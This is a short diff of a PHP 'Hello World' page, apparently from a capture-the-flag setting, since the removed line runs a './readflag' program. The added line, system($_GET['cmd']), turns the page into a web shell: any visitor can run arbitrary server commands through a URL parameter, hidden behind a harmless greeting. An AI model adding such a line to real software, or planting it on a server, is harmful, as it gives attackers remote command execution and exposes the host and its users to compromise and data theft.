@@ -1,4 +1,4 @@
 <?php
     echo "Hello World!";
-    system('./readflag');
+    system($_GET['cmd']);
 ?>
